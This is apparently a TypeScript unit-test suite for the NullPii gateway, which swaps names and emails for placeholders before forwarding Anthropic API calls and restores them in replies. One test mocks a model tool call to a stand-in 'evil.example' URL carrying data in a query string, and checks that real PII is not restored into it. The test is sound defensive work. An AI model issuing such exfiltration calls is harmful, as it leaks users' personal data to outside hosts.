// SPDX-License-Identifier: Apache-2.0
//
// Gateway unit tests. The ML engine (`NullPii`) and the upstream
// `fetch` are both mocked — this suite verifies routing, walk-and-
// rewrite logic, error propagation, and request lifecycle. The real
// model + real Anthropic round-trip lives in an E2E suite gated on
// `NULLPII_GATEWAY_E2E=1` (not in this PR).

import type { AddressInfo } from 'node:net';
import type { NullPii } from 'nullpii';
import { PiiVault } from 'nullpii';

import { afterEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import { buildServer } from '../src/server.js';
import type { AnthropicResponse } from '../src/types.js';
import { BASE_TEST_CONFIG } from './fixtures.js';

const TEST_CONFIG: GatewayConfig = BASE_TEST_CONFIG;

/**
 * Mock NullPii: a real PiiVault for placeholder bookkeeping + a
 * deterministic "detect" pass that flags every occurrence of `John` and
 * `john@acme.io` in the input. Lets the gateway test prove the walk
 * touched every text block without depending on ONNX.
 */
function buildMockNullPii(): {
  np: NullPii;
  vault: PiiVault;
  sanitizeCalls: string[];
  restoreCalls: string[];
} {
  const vault = new PiiVault();
  const sanitizeCalls: string[] = [];
  const restoreCalls: string[] = [];

  const mock = {
    async sanitize(text: string, sessionId?: string) {
      sanitizeCalls.push(text);
      const id = sessionId ?? vault.createSession();
      const spans = findSpans(text);
      const r = vault.sanitize(text, spans, id);
      return { sessionId: id, sanitized: r.sanitized, spans };
    },
    restore(text: string, sessionId: string) {
      restoreCalls.push(text);
      return vault.restore(text, sessionId);
    },
    createSession() {
      return vault.createSession();
    },
    destroySession(sessionId: string) {
      vault.destroySession(sessionId);
    },
  };

  return { np: mock as unknown as NullPii, vault, sanitizeCalls, restoreCalls };
}

function findSpans(text: string) {
  const out: {
    label: 'private_person' | 'private_email';
    start: number;
    end: number;
    text: string;
    score: number;
  }[] = [];
  for (const m of text.matchAll(/john@acme\.io/g)) {
    if (m.index !== undefined) {
      out.push({
        label: 'private_email',
        start: m.index,
        end: m.index + m[0].length,
        text: m[0],
        score: 1,
      });
    }
  }
  for (const m of text.matchAll(/\bJohn\b/g)) {
    if (m.index !== undefined) {
      out.push({
        label: 'private_person',
        start: m.index,
        end: m.index + m[0].length,
        text: m[0],
        score: 1,
      });
    }
  }
  return out;
}

interface FetchCall {
  url: string;
  init: RequestInit;
}

function buildMockFetch(
  responder: (call: FetchCall) => {
    status?: number;
    body: string;
    headers?: Record<string, string>;
  },
): { fetchImpl: (url: string, init: RequestInit) => Promise<Response>; calls: FetchCall[] } {
  const calls: FetchCall[] = [];
  const fetchImpl = async (url: string, init: RequestInit) => {
    calls.push({ url, init });
    const r = responder({ url, init });
    return new Response(r.body, {
      status: r.status ?? 200,
      headers: r.headers ?? { 'content-type': 'application/json' },
    });
  };
  return { fetchImpl, calls };
}

const activeApps: Array<{ close: () => Promise<void> }> = [];
function trackApp(app: { close: () => Promise<void> }): void {
  activeApps.push(app);
}
afterEach(async () => {
  await Promise.all(activeApps.map((a) => a.close()));
  activeApps.length = 0;
});

describe('gateway · POST /v1/messages (non-streaming)', () => {
  it('sanitises user message, forwards upstream, restores response', async () => {
    const { np, sanitizeCalls } = buildMockNullPii();
    const { fetchImpl, calls } = buildMockFetch((call) => {
      const forwarded = JSON.parse(call.init.body as string) as {
        messages: Array<{ content: string }>;
      };
      const sanitizedPrompt = forwarded.messages[0]?.content ?? '';
      const echoPlaceholder = sanitizedPrompt.match(/\{\{PII_[^}]+\}\}/)?.[0] ?? '';
      const resp: AnthropicResponse = {
        id: 'msg_test',
        type: 'message',
        role: 'assistant',
        content: [{ type: 'text', text: `Reply mentioning ${echoPlaceholder}` }],
      };
      return { body: JSON.stringify(resp) };
    });

    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      headers: {
        'content-type': 'application/json',
        'x-api-key': 'sk-test-123',
        'anthropic-version': '2023-06-01',
      },
      payload: {
        model: 'claude-test',
        messages: [{ role: 'user', content: 'Hi John' }],
      },
    });

    expect(res.statusCode).toBe(200);
    const body = res.json() as AnthropicResponse;
    const first = body.content[0] as { type: 'text'; text: string };
    expect(first.text).toBe('Reply mentioning John'); // restored

    // Upstream saw the sanitised body — no `John` in the forwarded payload.
    expect(calls).toHaveLength(1);
    const call = calls[0];
    if (call === undefined) throw new Error('expected one upstream call');
    expect(call.init.body as string).not.toContain('John');
    expect(call.init.body as string).toContain('{{PII_PRIVATE_PERSON_');
    // Header forwarding — x-api-key + anthropic-version reached the upstream.
    const fwd = call.init.headers as Record<string, string>;
    expect(fwd['x-api-key']).toBe('sk-test-123');
    expect(fwd['anthropic-version']).toBe('2023-06-01');
    expect(fwd['content-type']).toBe('application/json');

    // sanitize() was invoked on the user message.
    expect(sanitizeCalls).toContain('Hi John');
  });

  it('walks system + content-block array + tool_result string', async () => {
    const { np } = buildMockNullPii();
    let forwardedBody = '';
    let upstreamCalled = false;
    const { fetchImpl } = buildMockFetch((call) => {
      forwardedBody = call.init.body as string;
      upstreamCalled = true;
      const resp: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [{ type: 'text', text: 'ok' }],
      };
      return { body: JSON.stringify(resp) };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        system: [{ type: 'text', text: 'You help John.' }],
        messages: [
          {
            role: 'user',
            content: [
              { type: 'text', text: 'Hi John' },
              {
                type: 'tool_result',
                tool_use_id: 'tu_1',
                content: 'Lookup found John at john@acme.io',
              },
            ],
          },
        ],
      },
    });

    expect(res.statusCode).toBe(200);
    if (!upstreamCalled) throw new Error('upstream not called');
    expect(forwardedBody).not.toContain('John');
    expect(forwardedBody).not.toContain('john@acme.io');
    // System placeholder + 2 message placeholders (Hi John block, tool_result block contains John + email).
    expect((forwardedBody.match(/\{\{PII_PRIVATE_PERSON_/g) ?? []).length).toBeGreaterThanOrEqual(
      3,
    );
    expect(forwardedBody).toContain('{{PII_PRIVATE_EMAIL_');
  });

  it('streams: sanitises user message, pipes SSE response through restorer', async () => {
    const { np } = buildMockNullPii();
    // The upstream replies with a hand-crafted SSE stream. The body of
    // the `text_delta` echoes the placeholder back so we can verify the
    // gateway restored it before the client saw the bytes.
    const encoder = new TextEncoder();
    const fetchImpl = async (_url: string, init: RequestInit) => {
      const forwarded = JSON.parse(init.body as string) as { messages: Array<{ content: string }> };
      const sanitizedPrompt = forwarded.messages[0]?.content ?? '';
      const placeholder = sanitizedPrompt.match(/\{\{PII_[^}]+\}\}/)?.[0] ?? '';
      const frames = [
        `event: message_start\ndata: ${JSON.stringify({ type: 'message_start', message: { id: 'm', type: 'message', role: 'assistant', content: [] } })}\n\n`,
        `event: content_block_start\ndata: ${JSON.stringify({ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } })}\n\n`,
        `event: content_block_delta\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: `Reply about ${placeholder}` } })}\n\n`,
        `event: content_block_stop\ndata: ${JSON.stringify({ type: 'content_block_stop', index: 0 })}\n\n`,
        `event: message_stop\ndata: ${JSON.stringify({ type: 'message_stop' })}\n\n`,
      ];
      const body = new ReadableStream<Uint8Array>({
        start(controller) {
          for (const f of frames) controller.enqueue(encoder.encode(f));
          controller.close();
        },
      });
      return new Response(body, {
        status: 200,
        headers: { 'content-type': 'text/event-stream' },
      });
    };

    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: 'Hi John' }],
      },
    });

    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toContain('text/event-stream');
    // Restored output reaches the client; placeholder is never visible.
    expect(res.body).toContain('Reply about John');
    expect(res.body).not.toContain('{{PII_');
    // Pass-through events preserved.
    expect(res.body).toContain('"type":"message_start"');
    expect(res.body).toContain('"type":"message_stop"');
  });

  it('passes through non-2xx upstream verbatim (no envelope rewrap)', async () => {
    const { np } = buildMockNullPii();
    const upstreamBody = JSON.stringify({
      type: 'error',
      error: { type: 'overloaded_error', message: 'Overloaded' },
    });
    const { fetchImpl } = buildMockFetch(() => ({
      status: 529,
      body: upstreamBody,
      headers: { 'content-type': 'application/json' },
    }));
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: 'Hi' }] },
    });

    expect(res.statusCode).toBe(529);
    expect(res.body).toBe(upstreamBody);
  });

  it.each([false, true])(
    'logs an upstream error by status, length and type, never its body (stream: %s)',
    async (stream) => {
      const { np } = buildMockNullPii();
      // An error can quote the request: here an image URL the gateway
      // forwards without scanning.
      const quoted = 'https://img.example/ada-lovelace-passport.png';
      const upstreamBody = JSON.stringify({
        type: 'error',
        error: { type: 'invalid_request_error', message: `Could not fetch ${quoted}` },
      });
      const { fetchImpl } = buildMockFetch(() => ({ status: 400, body: upstreamBody }));
      const lines: string[] = [];
      const app = await buildServer({
        config: { ...TEST_CONFIG, logLevel: 'warn' },
        np,
        fetchImpl,
        logStream: { write: (line) => lines.push(line) },
      });
      trackApp(app);

      const res = await app.inject({
        method: 'POST',
        url: '/v1/messages',
        payload: { model: 'claude-test', stream, messages: [{ role: 'user', content: 'Hi' }] },
      });

      expect(res.statusCode).toBe(400);
      expect(res.body).toBe(upstreamBody);
      const logged = lines.map((l) => JSON.parse(l) as Record<string, unknown>);
      const entry = logged.find((l) => l.msg === 'anthropic.upstream_error');
      expect(entry).toMatchObject({
        upstreamStatus: 400,
        bodyLength: upstreamBody.length,
        errorType: 'invalid_request_error',
      });
      expect(lines.join('\n')).not.toContain(quoted);
    },
  );

  it('returns 502 when upstream fetch throws', async () => {
    const { np } = buildMockNullPii();
    const fetchImpl = async () => {
      throw new Error('ECONNREFUSED');
    };
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: 'Hi' }] },
    });

    expect(res.statusCode).toBe(502);
    expect(res.json()).toMatchObject({ error: { type: 'nullpii_upstream_error' } });
  });
});

describe('gateway · tool_use coverage', () => {
  it('sanitises tool_use.input on REQUEST (client posts assistant history)', async () => {
    const { np } = buildMockNullPii();
    let forwardedBody = '';
    const { fetchImpl } = buildMockFetch((call) => {
      forwardedBody = call.init.body as string;
      const resp: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [{ type: 'text', text: 'ok' }],
      };
      return { body: JSON.stringify(resp) };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        messages: [
          {
            role: 'assistant',
            content: [
              {
                type: 'tool_use',
                id: 'tu_1',
                name: 'lookup_user',
                input: { name: 'John', email: 'john@acme.io', nested: { contact: 'John' } },
              },
            ],
          },
        ],
      },
    });

    expect(res.statusCode).toBe(200);
    expect(forwardedBody).not.toContain('"John"');
    expect(forwardedBody).not.toContain('john@acme.io');
    expect(forwardedBody).toContain('{{PII_PRIVATE_PERSON_');
    expect(forwardedBody).toContain('{{PII_PRIVATE_EMAIL_');
  });

  it('restores tool_use.input on non-streaming RESPONSE', async () => {
    const { np } = buildMockNullPii();
    const { fetchImpl } = buildMockFetch((call) => {
      // Upstream echoes the placeholder back inside tool_use.input
      const forwarded = JSON.parse(call.init.body as string) as {
        messages: Array<{ content: string | Array<{ text?: string }> }>;
      };
      const userContent = forwarded.messages[0]?.content;
      const userText = typeof userContent === 'string' ? userContent : '';
      const placeholder = userText.match(/\{\{PII_[^}]+\}\}/)?.[0] ?? '';
      const resp: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_2',
            name: 'write_file',
            input: { path: '/tmp/out.txt', body: `Subject: ${placeholder}` },
          },
        ],
      };
      return { body: JSON.stringify(resp) };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        messages: [{ role: 'user', content: 'Write about John' }],
      },
    });

    expect(res.statusCode).toBe(200);
    const body = res.json() as AnthropicResponse;
    const block = body.content[0] as { type: 'tool_use'; input: { body: string; path: string } };
    expect(block.type).toBe('tool_use');
    expect(block.input.body).toBe('Subject: John');
    expect(block.input.body).not.toContain('{{PII_');
  });

  it('keeps placeholders in the input of a tool outside restoreTools (JSON and SSE)', async () => {
    const { np } = buildMockNullPii();
    const echoInTool = (name: string) =>
      buildMockFetch((call) => {
        const forwarded = JSON.parse(call.init.body as string) as {
          messages: Array<{ content: string }>;
          stream?: boolean;
        };
        const placeholder = forwarded.messages[0]?.content.match(/\{\{PII_[^}]+\}\}/)?.[0] ?? '';
        const input = { url: `https://evil.example/?q=${placeholder}` };
        if (forwarded.stream !== true) {
          const resp: AnthropicResponse = {
            id: 'msg',
            type: 'message',
            role: 'assistant',
            content: [{ type: 'tool_use', id: 'tu_net', name, input }],
          };
          return { body: JSON.stringify(resp) };
        }
        const frames = [
          {
            type: 'content_block_start',
            index: 0,
            content_block: { type: 'tool_use', id: 'tu_net', name, input: {} },
          },
          {
            type: 'content_block_delta',
            index: 0,
            delta: { type: 'input_json_delta', partial_json: JSON.stringify(input) },
          },
          { type: 'content_block_stop', index: 0 },
        ];
        return {
          body: frames.map((f) => `event: ${f.type}\ndata: ${JSON.stringify(f)}\n\n`).join(''),
          headers: { 'content-type': 'text/event-stream' },
        };
      });
    for (const name of ['WebFetch', 'mcp__browser__navigate']) {
      for (const stream of [false, true]) {
        const app = await buildServer({
          config: TEST_CONFIG,
          np,
          fetchImpl: echoInTool(name).fetchImpl,
        });
        trackApp(app);
        const res = await app.inject({
          method: 'POST',
          url: '/v1/messages',
          payload: {
            model: 'claude-test',
            stream,
            messages: [{ role: 'user', content: 'Find John' }],
          },
        });
        expect(res.statusCode, `${name} stream=${stream}`).toBe(200);
        expect(res.body, `${name} stream=${stream}`).toContain('{{PII_');
        expect(res.body, `${name} stream=${stream}`).not.toContain('q=John');
      }
    }
  });

  it('sanitises tools[].description on the request', async () => {
    const { np } = buildMockNullPii();
    let forwardedBody = '';
    const { fetchImpl } = buildMockFetch((call) => {
      forwardedBody = call.init.body as string;
      const resp: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [{ type: 'text', text: 'ok' }],
      };
      return { body: JSON.stringify(resp) };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        tools: [
          {
            name: 'lookup_user',
            description: 'Find records for John (john@acme.io) in the CRM.',
            input_schema: { type: 'object' },
          },
        ],
        messages: [{ role: 'user', content: 'Hi' }],
      },
    });

    expect(res.statusCode).toBe(200);
    const forwarded = JSON.parse(forwardedBody) as {
      tools: Array<{ description: string }>;
    };
    const descr = forwarded.tools[0]?.description ?? '';
    expect(descr).not.toContain('John');
    expect(descr).not.toContain('john@acme.io');
    expect(descr).toContain('{{PII_PRIVATE_PERSON_');
    expect(descr).toContain('{{PII_PRIVATE_EMAIL_');
  });
});

describe('gateway · preservation hint injection', () => {
  it('appends LLM_PRESERVATION_HINT when PII was captured and system is unset', async () => {
    const { np } = buildMockNullPii();
    let forwardedBody = '';
    const { fetchImpl } = buildMockFetch((call) => {
      forwardedBody = call.init.body as string;
      return {
        body: JSON.stringify({
          id: 'm',
          type: 'message',
          role: 'assistant',
          content: [{ type: 'text', text: 'ok' }],
        } as AnthropicResponse),
      };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: 'Hi John' }] },
    });
    expect(res.statusCode).toBe(200);
    const forwarded = JSON.parse(forwardedBody) as { system?: string };
    // Hint mentions placeholder pattern verbatim.
    expect(typeof forwarded.system).toBe('string');
    expect(forwarded.system).toContain('{{PII_');
  });

  it('SKIPS hint when no PII was captured (cache parity with direct upstream)', async () => {
    const { np } = buildMockNullPii();
    let forwardedBody = '';
    const { fetchImpl } = buildMockFetch((call) => {
      forwardedBody = call.init.body as string;
      return {
        body: JSON.stringify({
          id: 'm',
          type: 'message',
          role: 'assistant',
          content: [{ type: 'text', text: 'ok' }],
        } as AnthropicResponse),
      };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: 'Hi' }] },
    });
    expect(res.statusCode).toBe(200);
    const forwarded = JSON.parse(forwardedBody) as { system?: unknown };
    // No PII → no hint → body.system unchanged (still undefined as sent).
    expect(forwarded.system).toBeUndefined();
  });

  it('appends to existing string system (PRESERVES prefix for Anthropic prompt cache)', async () => {
    const { np } = buildMockNullPii();
    let forwardedBody = '';
    const { fetchImpl } = buildMockFetch((call) => {
      forwardedBody = call.init.body as string;
      return {
        body: JSON.stringify({
          id: 'm',
          type: 'message',
          role: 'assistant',
          content: [{ type: 'text', text: 'ok' }],
        } as AnthropicResponse),
      };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const userSystem = 'You are a helpful assistant.';
    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        system: userSystem,
        messages: [{ role: 'user', content: 'Hi John' }],
      },
    });
    expect(res.statusCode).toBe(200);
    const forwarded = JSON.parse(forwardedBody) as { system: string };
    // Original user system MUST appear at the start (prefix preserved
    // for Anthropic's prompt cache); hint glued at the tail.
    expect(forwarded.system.startsWith(userSystem)).toBe(true);
    expect(forwarded.system).toContain('{{PII_');
  });

  it('hint is appended AFTER sanitize so the boilerplate is never scanned', async () => {
    const { np, sanitizeCalls } = buildMockNullPii();
    const { fetchImpl } = buildMockFetch(() => ({
      body: JSON.stringify({
        id: 'm',
        type: 'message',
        role: 'assistant',
        content: [{ type: 'text', text: 'ok' }],
      } as AnthropicResponse),
    }));
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      // Must contain PII so the hint actually fires (it's gated on
      // `captured > 0` to avoid invalidating Anthropic's prompt cache
      // on PII-free turns).
      payload: { model: 'claude-test', messages: [{ role: 'user', content: 'Hi John' }] },
    });
    expect(res.statusCode).toBe(200);
    // None of the sanitize calls should have been on the hint boilerplate
    // (which contains literal `{{PII_...}}` patterns and would explode if
    // run through the model).
    for (const c of sanitizeCalls) {
      expect(c).not.toContain('{{PII_PRIVATE_');
    }
  });
});

describe('gateway · upstream error header passthrough', () => {
  it('forwards retry-after + anthropic-ratelimit-* headers on 429', async () => {
    const { np } = buildMockNullPii();
    const { fetchImpl } = buildMockFetch(() => ({
      status: 429,
      body: JSON.stringify({
        type: 'error',
        error: { type: 'rate_limit_error', message: 'slow down' },
      }),
      headers: {
        'content-type': 'application/json',
        'retry-after': '42',
        'anthropic-ratelimit-requests-remaining': '0',
        'anthropic-ratelimit-requests-reset': '2026-05-20T01:00:00Z',
      },
    }));
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: 'Hi' }] },
    });
    expect(res.statusCode).toBe(429);
    expect(res.headers['retry-after']).toBe('42');
    expect(res.headers['anthropic-ratelimit-requests-remaining']).toBe('0');
    expect(res.headers['anthropic-ratelimit-requests-reset']).toBe('2026-05-20T01:00:00Z');
  });
});

describe('gateway · POST /v1/messages/count_tokens', () => {
  it('sanitises body before forwarding; returns upstream body verbatim', async () => {
    const { np } = buildMockNullPii();
    let forwardedBody = '';
    let forwardedUrl = '';
    const { fetchImpl } = buildMockFetch((call) => {
      forwardedUrl = call.url;
      forwardedBody = call.init.body as string;
      return {
        body: JSON.stringify({ input_tokens: 12 }),
        headers: { 'content-type': 'application/json' },
      };
    });
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages/count_tokens',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: 'Hi John' }] },
    });
    expect(res.statusCode).toBe(200);
    expect(forwardedUrl).toContain('/v1/messages/count_tokens');
    expect(forwardedBody).not.toContain('John');
    expect(forwardedBody).toContain('{{PII_PRIVATE_PERSON_');
    expect(res.body).toContain('"input_tokens":12');
  });
});

/** Upstream SSE stream that sends a ping every `SLOW_STREAM_TICK_MS` for
 * about a second, and errors as soon as the gateway aborts its fetch. */
const SLOW_STREAM_TICK_MS = 25;
const SLOW_STREAM_FRAMES = 40;
/** How long a disconnect may take to reach the upstream signal. */
const DISCONNECT_WAIT_MS = 500;
const POLL_MS = 10;
const PING_FRAME = `event: ping\ndata: ${JSON.stringify({ type: 'ping' })}\n\n`;

function slowSseBody(signal: AbortSignal | undefined): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder();
  let timer: ReturnType<typeof setInterval> | undefined;
  let done = false;
  const stop = (): void => {
    done = true;
    clearInterval(timer);
  };
  return new ReadableStream<Uint8Array>({
    start(controller) {
      let sent = 0;
      timer = setInterval(() => {
        controller.enqueue(encoder.encode(PING_FRAME));
        sent += 1;
        if (sent < SLOW_STREAM_FRAMES) return;
        stop();
        controller.close();
      }, SLOW_STREAM_TICK_MS);
      signal?.addEventListener(
        'abort',
        () => {
          if (done) return;
          stop();
          controller.error(signal.reason);
        },
        { once: true },
      );
    },
    cancel: stop,
  });
}

async function waitFor(condition: () => boolean, timeoutMs: number): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!condition() && Date.now() < deadline) {
    await new Promise((resolve) => setTimeout(resolve, POLL_MS));
  }
}

describe('gateway · vault session lifecycle', () => {
  const okMessage: AnthropicResponse = {
    id: 'msg',
    type: 'message',
    role: 'assistant',
    content: [{ type: 'text', text: 'ok' }],
  };
  const okStream = `event: message_stop\ndata: ${JSON.stringify({ type: 'message_stop' })}\n\n`;
  const sseHeaders = { 'content-type': 'text/event-stream' };
  const outcomes: Array<[string, boolean, number, () => Promise<Response>]> = [
    ['a restored reply', false, 200, async () => new Response(JSON.stringify(okMessage))],
    ['a restored stream', true, 200, async () => new Response(okStream, { headers: sseHeaders })],
    ['an upstream 4xx', false, 400, async () => new Response('{}', { status: 400 })],
    ['an upstream 4xx on a stream', true, 400, async () => new Response('{}', { status: 400 })],
    [
      'a failed fetch',
      true,
      502,
      async () => {
        throw new Error('ECONNREFUSED');
      },
    ],
  ];

  it.each(outcomes)(
    'leaves no live vault session after %s',
    async (_outcome, stream, status, fetchImpl) => {
      const { np, vault } = buildMockNullPii();
      const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
      trackApp(app);

      const res = await app.inject({
        method: 'POST',
        url: '/v1/messages',
        payload: { model: 'claude-test', stream, messages: [{ role: 'user', content: 'Hi John' }] },
      });

      expect(res.statusCode).toBe(status);
      expect(vault.sessionCount).toBe(0);
    },
  );

  it.each([
    ['/v1/messages', false],
    ['/v1/messages', true],
    ['/v1/messages/count_tokens', false],
    ['/v1/chat/completions', false],
  ])('leaves no live vault session when sanitize throws (%s, stream: %s)', async (url, stream) => {
    const vault = new PiiVault();
    const np = {
      async sanitize(): Promise<never> {
        throw new Error('detector failed');
      },
      restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
      createSession: () => vault.createSession(),
      destroySession: (sessionId: string) => vault.destroySession(sessionId),
    } as unknown as NullPii;
    const { fetchImpl, calls } = buildMockFetch(() => ({ body: '{}' }));
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);

    const res = await app.inject({
      method: 'POST',
      url,
      payload: { model: 'claude-test', stream, messages: [{ role: 'user', content: 'Hi John' }] },
    });

    expect(res.statusCode).toBe(500);
    expect(calls).toHaveLength(0);
    expect(vault.sessionCount).toBe(0);
  });
});

describe('gateway · client disconnect', () => {
  // Real sockets: `app.inject` cannot drop a client connection mid-stream.
  it.each(['/v1/messages', '/v1/chat/completions'])(
    'cancels the upstream call when the client disconnects mid-stream (%s)',
    async (path) => {
      const { np } = buildMockNullPii();
      let upstreamSignal: AbortSignal | undefined;
      const fetchImpl = async (_url: string, init: RequestInit) => {
        upstreamSignal = init.signal ?? undefined;
        return new Response(slowSseBody(upstreamSignal), {
          status: 200,
          headers: { 'content-type': 'text/event-stream' },
        });
      };
      const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
      trackApp(app);
      await app.listen({ host: '127.0.0.1', port: 0 });
      const { port } = app.server.address() as AddressInfo;

      const client = new AbortController();
      const res = await fetch(`http://127.0.0.1:${port}${path}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          model: 'test',
          stream: true,
          messages: [{ role: 'user', content: 'Hi' }],
        }),
        signal: client.signal,
      });
      // The stream is live: the first frame reached the client.
      expect(res.status).toBe(200);
      await res.body?.getReader().read();
      expect(upstreamSignal?.aborted).toBe(false);

      client.abort();
      await waitFor(() => upstreamSignal?.aborted === true, DISCONNECT_WAIT_MS);

      expect(upstreamSignal?.aborted).toBe(true);
    },
  );
});

describe('gateway · /health', () => {
  it('returns 200 ok', async () => {
    const { np } = buildMockNullPii();
    const { fetchImpl } = buildMockFetch(() => ({ body: '{}' }));
    const app = await buildServer({ config: TEST_CONFIG, np, fetchImpl });
    trackApp(app);
    const res = await app.inject({ method: 'GET', url: '/health' });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual({ status: 'ok' });
  });
});
